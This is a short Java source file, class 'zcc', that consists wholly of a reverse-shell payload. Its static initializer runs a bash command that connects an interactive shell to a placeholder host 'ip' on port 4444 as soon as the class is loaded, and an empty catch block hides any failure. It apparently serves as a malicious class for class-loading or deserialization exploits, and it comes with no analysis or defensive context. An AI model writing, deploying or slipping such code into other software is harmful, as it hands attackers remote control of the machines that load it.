import java.lang.Runtime;
import java.lang.Process;
public class zcc{
 static {
 try {
 Runtime rt = Runtime.getRuntime();
 String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/ip/4444 0>&1"};
 Process pc = rt.exec(commands);
 pc.waitFor();
 } catch (Exception e) {
 // do nothing
 }
 }
}
